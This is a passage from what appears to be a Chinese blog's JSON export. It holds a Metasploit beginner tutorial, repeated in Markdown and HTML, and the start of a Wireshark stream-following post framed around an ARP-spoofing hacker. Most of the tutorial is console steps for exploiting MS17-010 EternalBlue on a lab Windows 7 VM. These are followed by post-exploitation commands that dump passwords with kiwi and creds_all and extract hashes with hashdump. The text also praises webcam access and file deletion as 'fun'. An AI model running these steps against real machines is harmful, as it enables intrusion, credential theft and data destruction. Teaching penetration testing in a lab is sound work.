MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)   //说明扫描到的这台win 7存在ms17-010漏洞\n[*] 192.168.182.134:445    - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf6 auxiliary(scanner/smb/smb_ms17_010) > back\n```\n\n![](metasploit渗透测试入门/d09f62c099a26f1f397576023f83af77ad0d31f3.png)\n\n从上图画红线处知道，扫描到的这台win7 存在ms17-010漏洞\n\n第三步：\n\n```\n使用ms17-010渗透模块对靶机Win7进行渗透\nmsf6 > use 0   //使用ms17-010渗透模块对靶机Win7进行渗透\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > show options  //查看可设置的选项\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 192.168.182.134\nRHOST => 192.168.182.134   //设置渗透目标IP\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > exploit   //执行渗透\n```\n\n![](metasploit渗透测试入门/4bc0ab674fd9e7529eb6ac5d7538693e1c0dd92a.png)\n\n![](metasploit渗透测试入门/66ba7fc4908ffcfa0b7b82bc686e3820438307c5.png)\n\n从上图可见已经成功渗透到win7。\n\n不信！那你可以用pwd，dir，shell 检查一下,或是execute -i -f cmd.exe来执行cmd命令，又或者可以screenshot截图\n\n![](metasploit渗透测试入门/9eec7d01622ce0d8fcd9640995e2de29933f3a7f.png)\n\n![](metasploit渗透测试入门/588549d38cf8fc5ce11280eb3b1cc2b9f7ee8d1b.png)\n\n或者也可以用以下2条命令查看系统用户名和密码\n\n```\nload kiwi\ncreds_all\n```\n\n![](metasploit渗透测试入门/6fe033baccfc41288ad6d787c56426f8b75705e9.png)\n\n到了这里，上面这些命令的执行，都是后渗透测试的问题了，既是windows下的cmd命令及其相关操作的事情了。下面再来一个获得用户hash值的命令\n\n`run post/windows/gather/hashdump`\n\n![](metasploit渗透测试入门/dd1b7a71f912663ff9bcc131969d1409525cce78.png)\n\n![](metasploit渗透测试入门/4d4f742c5f19cef39b952324c9c120b4a61ed63c.png)\n\n注：不要忘记了保存哦，下次可以直接再利用哈～下面借别人的图展示：\n\n![](metasploit渗透测试入门/01a74c8cbd00d662af1d6e41c15dbd613947e9e3.jpg)\n\n后渗透测试中会有很多好玩的指令操作，如打开摄像头，删除文件，删除目标主机目录，创建系统用户等等。\n\n![](metasploit渗透测试入门/85a98c0d5bb71142f0e74a173b6faf1bc6d24a53.gif)\n\n![](metasploit渗透测试入门/7976c0056e23f81c48a5e58c3c590d627a882e33.png)\n\n![](metasploit渗透测试入门/0d1cb80ec5a6b930880952b22bcafd244716b33d.png)\n\n![](metasploit渗透测试入门/fec279cd0cec3e3ebd0f93b1ffb8ee97ad616631.png)\n","slug":"metasploit渗透测试入门","published":1,"updated":"2024-11-15T12:17:38.905Z","comments":1,"layout":"post","photos":[],"_id":"cm3kcor2y000c8oi41s9l8aqg","content":"<h1 id=\"metasploit渗透测试入门\"><a href=\"#metasploit渗透测试入门\" class=\"headerlink\" title=\"metasploit渗透测试入门\"></a>metasploit渗透测试入门</h1><img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/eda8f852311aeedff007fa3c146d4a0ccb113e3e.png\" class=\"\" title=\"loading-ag-445\">\n\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/5a10b2b436d19787fabe4a53785605bf3e48d9d0.png\" class=\"\">\n\n<p>WannaCry勒索病毒席卷全球，一旦中了WannaCry病毒电脑文件会被“加密劫持”，黑客要求受害者支付高昂赎金（比特币）才能拿到解密秘钥。 而这枚WannaCry勒索病毒，就是黑客拿着美国安全局泄露的永恒之蓝攻击代码进行研制，并进行大肆勒索传播。</p>\n<p>MS17-010是Windows SMBv1服务中存在的远程代码执行漏洞；<br> • 开启SMB服务（ 445端口） 的的系统可被执行远程代码， 从而导致被远程控制；<br> • 受影响系统： Windows XP、 Windows 7&#x2F;8&#x2F;10、 Server 2003&#x2F;2008&#x2F;2012&#x2F;2016</p>\n<p>只要用户打上MS17-010这个补丁，就可以避免这次攻击。</p>\n<h2 id=\"MSF-基础简介\"><a href=\"#MSF-基础简介\" class=\"headerlink\" title=\"MSF 基础简介\"></a>MSF 基础简介</h2><p>Metasploit 是一个渗透测试平台，使您能够查找，利用和验证漏洞。该平台包括 Metasploit 框架及其商业对手，如 Metasploit Pro。 Metasploit 目前是全球最常见的渗透测试框架，位居 secTools 排行榜第 2 位。</p>\n<p>metasploit是一款kali自带的漏洞利用神器，在接下来的2个案例中，我们将<u>利用WIN7主机的ms17-010漏洞和XP主机的ms08-067漏洞</u>，进行渗透攻击演示，并获得目标主机的控制权，带你闯进渗透测试的神之领域。实验可以参考David Kennedy的《Metasploit:The Penetration Tester’s Guide》，清华大学诸葛建伟老师翻译的《Metasploit渗透测试指南》。</p>\n<p>在<strong>kali虚拟机</strong>中打开<strong>metasploit</strong>，命令行输入：<code>msfconsole</code></p>\n<p><mark>MSF 模块组织按照不同的用途分为 7 种类型的模块（Modules）：</mark></p>\n<p>1、辅助模块 Auxiliary（Aux)，执行扫描之类的动作</p>\n<p>2、渗透攻击模块 Exploits，用于实际发起渗透攻击</p>\n<p>3、攻击载荷模块（payloads) 目标系统被成功渗透后执行的代码，payload 中的主要内容包括 shellcode，一段获取 shell 的代码。</p>\n<p>后面这几个模块一般不是很常用，大家简单的了解一下</p>\n<p>4、后渗透攻击模块（Post)</p>\n<p>5、编码器模块（Encoders)</p>\n<p>6、空指令模块（Nops)</p>\n<p>7、免杀模块 （evasion)</p>\n<p><mark>MSF 常用命令</mark></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">search 根据关键字搜索模块 </span><br><span class=\"line\">show auxiliary 查看所有可用的辅助攻击模块 </span><br><span class=\"line\">show exploits 查看所有可用的渗透攻击模块 </span><br><span class=\"line\">show targets 查看所有载荷代码</span><br><span class=\"line\">show options </span><br><span class=\"line\">info 显示模块的详细信息 </span><br><span class=\"line\">use 使用指定的测试模块 </span><br><span class=\"line\">back 退出一级</span><br><span class=\"line\">exit 退出</span><br><span class=\"line\">set/unset 设置/取消 当前模块的参数</span><br><span class=\"line\">run/exploit 执行扫描/渗透（2都相同效果）</span><br></pre></td></tr></table></figure>\n\n<p>实战：ms17-010 永恒之蓝</p>\n<p>查找 ms17-010 漏洞模块，搜索ms17-010相关漏洞利用代码：<br>msf5 &gt; search ms17-010</p>\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/a407b4cba8e4b90ee8e7fd7d59b2d52996bf8f22.png\" class=\"\">\n\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/2a26300befbffa17c2ba8ecadb69c3c8b45991d0.png\" class=\"\">\n\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/0862cf5b165437ac801778afa9704d627edc4618.png\" class=\"\">\n\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/2ace2cb635e639587e21a850f0b364cf76eef144.png\" class=\"\">\n\n<h5 id=\"实战：ms17-010-永恒之蓝\"><a href=\"#实战：ms17-010-永恒之蓝\" class=\"headerlink\" title=\"实战：ms17-010 永恒之蓝\"></a><mark>实战：ms17-010 永恒之蓝</mark></h5><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">需准备环境：Kali-Linux、Windows 7 虚拟机</span><br><span class=\"line\">Kali-Linux ：192.168.182.128</span><br><span class=\"line\">Windows 7： 192.168.182.134（确保处在同个网络下，能互相ping通）</span><br></pre></td></tr></table></figure>\n\n<p>第一步：</p>\n<p>查找 ms17-010 漏洞模块，搜索ms17-010相关漏洞利用代码：<br>msf6 &gt; search ms17-010</p>\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/f65b3dca8ecb31a23577e4e6ba6962faa3e87ee9.png\" class=\"\">\n\n<p>这里可以得到两个工具，其中</p>\n<p><strong>auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</strong>是永恒之蓝扫描模块，<strong>exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</strong>是永恒之蓝渗透代码，</p>\n<p>前者先扫描，若显示有漏洞，再用后者进行渗透。</p>\n<p>第二步：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">使用ms17-010扫描模块对靶机Win7进行扫描，才能进行下一步的渗透操作。</span><br><span class=\"line\">msf6 &gt; use 3   //使用ms17-010扫描模块，对靶机Win7进行扫描</span><br><span class=\"line\">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; set RHOST 192.168.86.132   //设置目标IP或网段</span><br><span class=\"line\">RHOST =&gt; 192.168.86.132</span><br><span class=\"line\">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run   //执行扫描</span><br><span class=\"line\"></span><br><span class=\"line\">[+] 192.168.182.134:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)   //说明扫描到的这台win 7存在ms17-010漏洞</span><br><span class=\"line\">[*] 192.168.182.134:445    - Scanned 1 of 1 hosts (100% complete)</span><br><span class=\"line\">[*] Auxiliary module execution completed</span><br><span class=\"line\">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; back</span><br></pre></td></tr></table></figure>\n\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/d09f62c099a26f1f397576023f83af77ad0d31f3.png\" class=\"\">\n\n<p>从上图画红线处知道，扫描到的这台win7 存在ms17-010漏洞</p>\n<p>第三步：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">使用ms17-010渗透模块对靶机Win7进行渗透</span><br><span class=\"line\">msf6 &gt; use 0   //使用ms17-010渗透模块对靶机Win7进行渗透</span><br><span class=\"line\">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options  //查看可设置的选项</span><br><span class=\"line\">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOST 192.168.182.134</span><br><span class=\"line\">RHOST =&gt; 192.168.182.134   //设置渗透目标IP</span><br><span class=\"line\">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit   //执行渗透</span><br></pre></td></tr></table></figure>\n\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/4bc0ab674fd9e7529eb6ac5d7538693e1c0dd92a.png\" class=\"\">\n\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/66ba7fc4908ffcfa0b7b82bc686e3820438307c5.png\" class=\"\">\n\n<p>从上图可见已经成功渗透到win7。</p>\n<p>不信！那你可以用pwd，dir，shell 检查一下,或是execute -i -f cmd.exe来执行cmd命令，又或者可以screenshot截图</p>\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/9eec7d01622ce0d8fcd9640995e2de29933f3a7f.png\" class=\"\">\n\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/588549d38cf8fc5ce11280eb3b1cc2b9f7ee8d1b.png\" class=\"\">\n\n<p>或者也可以用以下2条命令查看系统用户名和密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">load kiwi</span><br><span class=\"line\">creds_all</span><br></pre></td></tr></table></figure>\n\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/6fe033baccfc41288ad6d787c56426f8b75705e9.png\" class=\"\">\n\n<p>到了这里，上面这些命令的执行，都是后渗透测试的问题了，既是windows下的cmd命令及其相关操作的事情了。下面再来一个获得用户hash值的命令</p>\n<p><code>run post/windows/gather/hashdump</code></p>\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/dd1b7a71f912663ff9bcc131969d1409525cce78.png\" class=\"\">\n\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/4d4f742c5f19cef39b952324c9c120b4a61ed63c.png\" class=\"\">\n\n<p>注：不要忘记了保存哦，下次可以直接再利用哈～下面借别人的图展示：</p>\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/01a74c8cbd00d662af1d6e41c15dbd613947e9e3.jpg\" class=\"\">\n\n<p>后渗透测试中会有很多好玩的指令操作，如打开摄像头，删除文件，删除目标主机目录，创建系统用户等等。</p>\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/85a98c0d5bb71142f0e74a173b6faf1bc6d24a53.gif\" class=\"\">\n\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/7976c0056e23f81c48a5e58c3c590d627a882e33.png\" class=\"\">\n\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/0d1cb80ec5a6b930880952b22bcafd244716b33d.png\" class=\"\">\n\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/fec279cd0cec3e3ebd0f93b1ffb8ee97ad616631.png\" class=\"\">\n","excerpt":"","more":"<h1 id=\"metasploit渗透测试入门\"><a href=\"#metasploit渗透测试入门\" class=\"headerlink\" title=\"metasploit渗透测试入门\"></a>metasploit渗透测试入门</h1><img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/eda8f852311aeedff007fa3c146d4a0ccb113e3e.png\" class=\"\" title=\"loading-ag-445\">\n\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/5a10b2b436d19787fabe4a53785605bf3e48d9d0.png\" class=\"\">\n\n<p>WannaCry勒索病毒席卷全球，一旦中了WannaCry病毒电脑文件会被“加密劫持”，黑客要求受害者支付高昂赎金（比特币）才能拿到解密秘钥。 而这枚WannaCry勒索病毒，就是黑客拿着美国安全局泄露的永恒之蓝攻击代码进行研制，并进行大肆勒索传播。</p>\n<p>MS17-010是Windows SMBv1服务中存在的远程代码执行漏洞；<br> • 开启SMB服务（ 445端口） 的的系统可被执行远程代码， 从而导致被远程控制；<br> • 受影响系统： Windows XP、 Windows 7&#x2F;8&#x2F;10、 Server 2003&#x2F;2008&#x2F;2012&#x2F;2016</p>\n<p>只要用户打上MS17-010这个补丁，就可以避免这次攻击。</p>\n<h2 id=\"MSF-基础简介\"><a href=\"#MSF-基础简介\" class=\"headerlink\" title=\"MSF 基础简介\"></a>MSF 基础简介</h2><p>Metasploit 是一个渗透测试平台，使您能够查找，利用和验证漏洞。该平台包括 Metasploit 框架及其商业对手，如 Metasploit Pro。 Metasploit 目前是全球最常见的渗透测试框架，位居 secTools 排行榜第 2 位。</p>\n<p>metasploit是一款kali自带的漏洞利用神器，在接下来的2个案例中，我们将<u>利用WIN7主机的ms17-010漏洞和XP主机的ms08-067漏洞</u>，进行渗透攻击演示，并获得目标主机的控制权，带你闯进渗透测试的神之领域。实验可以参考David Kennedy的《Metasploit:The Penetration Tester’s Guide》，清华大学诸葛建伟老师翻译的《Metasploit渗透测试指南》。</p>\n<p>在<strong>kali虚拟机</strong>中打开<strong>metasploit</strong>，命令行输入：<code>msfconsole</code></p>\n<p><mark>MSF 模块组织按照不同的用途分为 7 种类型的模块（Modules）：</mark></p>\n<p>1、辅助模块 Auxiliary（Aux)，执行扫描之类的动作</p>\n<p>2、渗透攻击模块 Exploits，用于实际发起渗透攻击</p>\n<p>3、攻击载荷模块（payloads) 目标系统被成功渗透后执行的代码，payload 中的主要内容包括 shellcode，一段获取 shell 的代码。</p>\n<p>后面这几个模块一般不是很常用，大家简单的了解一下</p>\n<p>4、后渗透攻击模块（Post)</p>\n<p>5、编码器模块（Encoders)</p>\n<p>6、空指令模块（Nops)</p>\n<p>7、免杀模块 （evasion)</p>\n<p><mark>MSF 常用命令</mark></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">search 根据关键字搜索模块 </span><br><span class=\"line\">show auxiliary 查看所有可用的辅助攻击模块 </span><br><span class=\"line\">show exploits 查看所有可用的渗透攻击模块 </span><br><span class=\"line\">show targets 查看所有载荷代码</span><br><span class=\"line\">show options </span><br><span class=\"line\">info 显示模块的详细信息 </span><br><span class=\"line\">use 使用指定的测试模块 </span><br><span class=\"line\">back 退出一级</span><br><span class=\"line\">exit 退出</span><br><span class=\"line\">set/unset 设置/取消 当前模块的参数</span><br><span class=\"line\">run/exploit 执行扫描/渗透（2都相同效果）</span><br></pre></td></tr></table></figure>\n\n<p>实战：ms17-010 永恒之蓝</p>\n<p>查找 ms17-010 漏洞模块，搜索ms17-010相关漏洞利用代码：<br>msf5 &gt; search ms17-010</p>\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/a407b4cba8e4b90ee8e7fd7d59b2d52996bf8f22.png\" class=\"\">\n\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/2a26300befbffa17c2ba8ecadb69c3c8b45991d0.png\" class=\"\">\n\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/0862cf5b165437ac801778afa9704d627edc4618.png\" class=\"\">\n\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/2ace2cb635e639587e21a850f0b364cf76eef144.png\" class=\"\">\n\n<h5 id=\"实战：ms17-010-永恒之蓝\"><a href=\"#实战：ms17-010-永恒之蓝\" class=\"headerlink\" title=\"实战：ms17-010 永恒之蓝\"></a><mark>实战：ms17-010 永恒之蓝</mark></h5><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">需准备环境：Kali-Linux、Windows 7 虚拟机</span><br><span class=\"line\">Kali-Linux ：192.168.182.128</span><br><span class=\"line\">Windows 7： 192.168.182.134（确保处在同个网络下，能互相ping通）</span><br></pre></td></tr></table></figure>\n\n<p>第一步：</p>\n<p>查找 ms17-010 漏洞模块，搜索ms17-010相关漏洞利用代码：<br>msf6 &gt; search ms17-010</p>\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/f65b3dca8ecb31a23577e4e6ba6962faa3e87ee9.png\" class=\"\">\n\n<p>这里可以得到两个工具，其中</p>\n<p><strong>auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</strong>是永恒之蓝扫描模块，<strong>exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</strong>是永恒之蓝渗透代码，</p>\n<p>前者先扫描，若显示有漏洞，再用后者进行渗透。</p>\n<p>第二步：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">使用ms17-010扫描模块对靶机Win7进行扫描，才能进行下一步的渗透操作。</span><br><span class=\"line\">msf6 &gt; use 3   //使用ms17-010扫描模块，对靶机Win7进行扫描</span><br><span class=\"line\">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; set RHOST 192.168.86.132   //设置目标IP或网段</span><br><span class=\"line\">RHOST =&gt; 192.168.86.132</span><br><span class=\"line\">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run   //执行扫描</span><br><span class=\"line\"></span><br><span class=\"line\">[+] 192.168.182.134:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)   //说明扫描到的这台win 7存在ms17-010漏洞</span><br><span class=\"line\">[*] 192.168.182.134:445    - Scanned 1 of 1 hosts (100% complete)</span><br><span class=\"line\">[*] Auxiliary module execution completed</span><br><span class=\"line\">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; back</span><br></pre></td></tr></table></figure>\n\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/d09f62c099a26f1f397576023f83af77ad0d31f3.png\" class=\"\">\n\n<p>从上图画红线处知道，扫描到的这台win7 存在ms17-010漏洞</p>\n<p>第三步：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">使用ms17-010渗透模块对靶机Win7进行渗透</span><br><span class=\"line\">msf6 &gt; use 0   //使用ms17-010渗透模块对靶机Win7进行渗透</span><br><span class=\"line\">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options  //查看可设置的选项</span><br><span class=\"line\">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOST 192.168.182.134</span><br><span class=\"line\">RHOST =&gt; 192.168.182.134   //设置渗透目标IP</span><br><span class=\"line\">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit   //执行渗透</span><br></pre></td></tr></table></figure>\n\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/4bc0ab674fd9e7529eb6ac5d7538693e1c0dd92a.png\" class=\"\">\n\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/66ba7fc4908ffcfa0b7b82bc686e3820438307c5.png\" class=\"\">\n\n<p>从上图可见已经成功渗透到win7。</p>\n<p>不信！那你可以用pwd，dir，shell 检查一下,或是execute -i -f cmd.exe来执行cmd命令，又或者可以screenshot截图</p>\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/9eec7d01622ce0d8fcd9640995e2de29933f3a7f.png\" class=\"\">\n\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/588549d38cf8fc5ce11280eb3b1cc2b9f7ee8d1b.png\" class=\"\">\n\n<p>或者也可以用以下2条命令查看系统用户名和密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">load kiwi</span><br><span class=\"line\">creds_all</span><br></pre></td></tr></table></figure>\n\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/6fe033baccfc41288ad6d787c56426f8b75705e9.png\" class=\"\">\n\n<p>到了这里，上面这些命令的执行，都是后渗透测试的问题了，既是windows下的cmd命令及其相关操作的事情了。下面再来一个获得用户hash值的命令</p>\n<p><code>run post/windows/gather/hashdump</code></p>\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/dd1b7a71f912663ff9bcc131969d1409525cce78.png\" class=\"\">\n\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/4d4f742c5f19cef39b952324c9c120b4a61ed63c.png\" class=\"\">\n\n<p>注：不要忘记了保存哦，下次可以直接再利用哈～下面借别人的图展示：</p>\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/01a74c8cbd00d662af1d6e41c15dbd613947e9e3.jpg\" class=\"\">\n\n<p>后渗透测试中会有很多好玩的指令操作，如打开摄像头，删除文件，删除目标主机目录，创建系统用户等等。</p>\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/85a98c0d5bb71142f0e74a173b6faf1bc6d24a53.gif\" class=\"\">\n\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/7976c0056e23f81c48a5e58c3c590d627a882e33.png\" class=\"\">\n\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/0d1cb80ec5a6b930880952b22bcafd244716b33d.png\" class=\"\">\n\n<img src=\"/2024/11/15/metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/fec279cd0cec3e3ebd0f93b1ffb8ee97ad616631.png\" class=\"\">\n"},{"title":"wireshark 跟踪数据流","date":"2024-11-15T13:20:24.000Z","_content":"\nwireshark 跟踪数据流\n\n黑客A通过ARP欺骗，使用Wireshark获取了整个局域网内的网络流量信息。无意之中，他发现有人在某个网站上上传了一份文件。但是他不知道怎么样通过Wireshark去还原这份文件，没办法，他将监听到的数据包保存为了一份Wireshark的监听记录\n\n可以自己准备一张图片test.jpg，并随便找一个允许上传的网站，然后用Wireshark将上传的过程抓包，这里我已经将自己的抓包结果保存成文件catchme.pcapng\n\n使用显示过滤器进行过滤，由于上传文件采用的是HTTP协议，因而使用过滤规则“http”，过滤之后发现数据包由原来的344个变成了137个，这样就很容易帮我们分析了。仔细分析，我们会在第209条数据包的info中看到upload这个词，我们怀疑这条就是涉及到上传的数据包。\n\n由于上传文件都是采用POST方法，因而我们也可以使用过滤规则“http.request.method==POST”进行更精确的过滤，这时就只有47个数据包了。因而掌握数据包过滤，是熟练掌握Wireshark的必备技能之一。\n\n虽然我们看到了有upload关键字，有POST方法，但是我们不能确定是不是真的就是上传文件的那个请求。双击第209号数据包进行专门分析，在应用层数据中可以看到确实是上传了文件，而且文件名是test.jpg。\n\n![](wireshark-跟踪数据流/2022-12-21-12-58-41-2022-09-13-23-43-43-image.png)\n\n在传输层部分可以看到，由于文件比较大，TCP协议将其分成了16个数据段Segment，每个数据段都是一个独立的数据包，点击各个Frame，就可以看到数据包中的内容。\n\n![](wireshark-跟踪数据流/2022-12-21-12-59-14-2022-09-13-23-44-29-image.png)\n\n但问题是每个数据包中都只包含了上传文件的一部分，要想还原上传的文件，就必须将这些被分片的数据包重新组合成一个整体。在Wireshark中提供了一项“数据流追踪”功能，就可以来完成这项任务。\n\n回到Wireshark的主界面，在209号数据包上点击右键，选择“追踪流/TCP流”，\n\n![](wireshark-跟踪数据流/2022-12-21-12-59-47-2022-09-13-23-49-12-image.png)\n\n这时整个TCP流就会在一个单独的窗口中显示出来，我们注意到这个窗口中的文件以两种颜色显示，其中红色用来标明从源地址前往目的地址的流量，而蓝色用来区分出相反方向也就是从目的地址到源地址的流量。\n\n将数据流保存成原始文件，以便下一步处理。需要